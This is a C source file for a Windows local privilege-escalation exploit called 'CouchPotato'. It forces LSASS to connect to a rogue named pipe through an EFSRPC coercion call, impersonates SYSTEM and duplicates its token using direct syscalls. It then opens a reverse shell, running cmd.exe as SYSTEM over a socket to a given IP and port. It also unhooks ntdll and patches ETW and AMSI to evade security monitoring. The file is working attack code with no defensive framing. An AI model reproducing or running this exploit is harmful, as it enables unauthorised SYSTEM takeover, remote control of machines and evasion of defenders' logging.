#define _CRT_SECURE_NO_WARNINGS
#define _WINSOCK_DEPRECATED_NO_WARNINGS
#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <rpc.h>
#include <stdio.h>
#include "couch_efsr_h.h"
#include "util.h"
#include <winsock2.h>

void* __RPC_USER MIDL_user_allocate(size_t n) {
    return HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, n);
}
void __RPC_USER MIDL_user_free(void* p) {
    if (p) HeapFree(GetProcessHeap(), 0, p);
}
void __RPC_USER PEXIMPORT_CONTEXT_HANDLE_rundown(
    PEXIMPORT_CONTEXT_HANDLE ctx) {
    (void)ctx;
}

static handle_t couch_bind(void) {
    RPC_STATUS st;
    RPC_WSTR sb = NULL;
    handle_t bh = NULL;

    st = RpcStringBindingComposeW(
        (RPC_WSTR)L"df1941c5-fe89-4e79-bf10-463657acf44d",
        (RPC_WSTR)L"ncacn_np",
        (RPC_WSTR)L"\\\\localhost",
        (RPC_WSTR)L"\\pipe\\efsrpc",
        NULL, &sb);
    if (st) { printf("[-] Compose: %ld\n", st); return NULL; }

    st = RpcBindingFromStringBindingW(sb, &bh);
    RpcStringFreeW(&sb);
    if (st) { printf("[-] FromString: %ld\n", st); return NULL; }

    st = RpcBindingSetAuthInfoW(bh,
        (RPC_WSTR)L"localhost",
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_AUTHN_GSS_NEGOTIATE,
        NULL, RPC_C_AUTHZ_NONE);
    if (st) { printf("[-] AuthInfo: %ld\n", st); RpcBindingFree(&bh); return NULL; }

    RpcBindingSetOption(bh, 12, 10000);
    return bh;
}

DWORD WINAPI efs_trigger(LPVOID param) {
    printf("[*] Trigger running\n");

    SC_HANDLE hSCM = OpenSCManagerA(NULL, NULL, SC_MANAGER_CONNECT);
    if (hSCM) {
        SC_HANDLE hSvc = OpenServiceA(hSCM, "EFS", SERVICE_START | SERVICE_QUERY_STATUS);
        if (hSvc) {
            StartServiceA(hSvc, 0, NULL);
            Sleep(1000);
            CloseServiceHandle(hSvc);
        }
        CloseServiceHandle(hSCM);
    }

    handle_t ht = couch_bind();
    if (!ht) return 1;
    printf("[*] Bound\n");

    long* pUsers = NULL;
    printf("[*] Calling EfsRpcQueryUsersOnFile\n");
    RpcTryExcept{
        long result = EfsRpcQueryUsersOnFile(
            ht,
            L"\\\\localhost/pipe/CouchPotato\\C$\\couch.txt",
            &pUsers
        );
        printf("[*] result: %ld\n", result);
    }
        RpcExcept(EXCEPTION_EXECUTE_HANDLER) {
        DWORD code = RpcExceptionCode();
        if (code != 0x71A)
            printf("[-] RPC exception: 0x%lX\n", code);
    }
    RpcEndExcept

        RpcBindingFree(&ht);
    return 0;
}

VOID efs_escalate(char* ip, char* port) {
    HANDLE hpipe = CreateNamedPipeA(
        "\\\\.\\pipe\\CouchPotato\\pipe\\srvsvc",
        PIPE_ACCESS_DUPLEX,
        PIPE_TYPE_BYTE | PIPE_READMODE_BYTE | PIPE_WAIT,
        PIPE_UNLIMITED_INSTANCES, 512, 512, NMPWAIT_WAIT_FOREVER, NULL);
    if (!hpipe || hpipe == INVALID_HANDLE_VALUE) {
        printf("[-] CreateNamedPipe: %lu\n", GetLastError()); return;
    }
    printf("[+] Pipe ready\n");

    HANDLE hThread = CreateThread(NULL, 0, efs_trigger, NULL, 0, NULL);
    if (!hThread) {
        printf("[-] CreateThread: %lu\n", GetLastError());
        CloseHandle(hpipe); return;
    }
    printf("[+] Trigger started\n");

    OVERLAPPED ov = { 0 };
    ov.hEvent = CreateEventA(NULL, TRUE, FALSE, NULL);
    ConnectNamedPipe(hpipe, &ov);

    DWORD w = WaitForSingleObject(ov.hEvent, 15000);
    WaitForSingleObject(hThread, 3000);
    CloseHandle(hThread);
    CloseHandle(ov.hEvent);

    if (w == WAIT_TIMEOUT) {
        printf("[-] Coercion failed\n");
        CloseHandle(hpipe); return;
    }
    printf("[+] LSASS connected\n");

    if (!ImpersonateNamedPipeClient(hpipe)) {
        printf("[-] ImpersonateNamedPipeClient: %lu\n", GetLastError());
        CloseHandle(hpipe); return;
    }
    printf("[+] Impersonating SYSTEM\n");

    g_ssn = getSSN("NtOpenThreadToken");
    g_syscall = getSyscallAddr("NtOpenThreadToken");
    HANDLE h_ex = NULL;
    NTSTATUS status = iNtOpenThreadToken(GetCurrentThread(), TOKEN_ALL_ACCESS, TRUE, &h_ex);
    if (!NT_SUCCESS(status)) {
        printf("[-] NtOpenThreadToken: 0x%lX\n", status);
        RevertToSelf(); CloseHandle(hpipe); return;
    }

    g_ssn = getSSN("NtDuplicateToken");
    g_syscall = getSyscallAddr("NtDuplicateToken");
    OBJECT_ATTRIBUTES oa = { sizeof(OBJECT_ATTRIBUTES) };
    HANDLE h_new = NULL;
    status = iNtDuplicateToken(h_ex, MAXIMUM_ALLOWED, &oa, FALSE, TokenPrimary, &h_new);
    if (!NT_SUCCESS(status)) {
        printf("[-] NtDuplicateToken: 0x%lX\n", status);
        CloseHandle(h_ex); RevertToSelf(); CloseHandle(hpipe); return;
    }
    printf("[+] SYSTEM token duplicated\n");

    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
    SOCKET sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    struct sockaddr_in addr = { 0 };
    addr.sin_family = AF_INET;
    addr.sin_port = htons(atoi(port));
    addr.sin_addr.s_addr = inet_addr(ip);
    connect(sock, &addr, sizeof(addr));
    SetHandleInformation((HANDLE)sock, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);

    STARTUPINFOW si = { sizeof(STARTUPINFOW) };
    PROCESS_INFORMATION pi = { 0 };
    si.hStdInput = (HANDLE)sock;
    si.hStdOutput = (HANDLE)sock;
    si.hStdError = (HANDLE)sock;
    si.dwFlags = STARTF_USESTDHANDLES;

    if (!CreateProcessAsUserW(h_new,
        L"C:\\Windows\\System32\\cmd.exe",
        NULL, NULL, NULL,
        TRUE,
        0, NULL, NULL, &si, &pi)) {
        printf("[-] CreateProcessAsUserW: %lu\n", GetLastError());
    }
    else {
        // patch EtwEventWrite in child 
        HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
        PVOID pEtwAddr = manual_procaddress(hNtdll, "EtwEventWrite");
        PVOID pWriteAddr = pEtwAddr; 
        g_ssn = getSSN("NtProtectVirtualMemory");
        g_syscall = getSyscallAddr("NtProtectVirtualMemory");
        BYTE  patch = 0xC3;
        SIZE_T sz = 1;
        ULONG old = 0;
        iNtProtectVirtualMemory(pi.hProcess, &pEtwAddr, &sz, PAGE_EXECUTE_READWRITE, &old);
        WriteProcessMemory(pi.hProcess, pWriteAddr, &patch, 1, NULL);  
        iNtProtectVirtualMemory(pi.hProcess, &pEtwAddr, &sz, old, &old);
        FlushInstructionCache(pi.hProcess, pWriteAddr, 1);
        printf("[+] SYSTEM shell spawned\n");

        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    }
    CloseHandle(h_new);
    closesocket(sock);
    WSACleanup();
}

int main(void) {
    LPSTR cmd = GetCommandLineA();
    BOOL q = FALSE; DWORD p = 0;
    while (cmd[p]) {
        if (cmd[p] == '"') q = !q;
        if (cmd[p] == ' ' && !q) break;
        p++;
    }
    while (cmd[p] == ' ') p++;
    char* a = cmd + p;
    char* s = strchr(a, ' ');
    if (!a[0] || !s) { printf("Usage: CouchPotato.exe <ip> <port>\n"); return 1; }

    char ip[16] = { 0 }, port[6] = { 0 };
    strncpy(ip, a, s - a);
    strcpy(port, s + 1);

    unhook_Ntdll();
    EtwPatch();  
    AmsiPatch();
    efs_escalate(ip, port);

    return 0;
}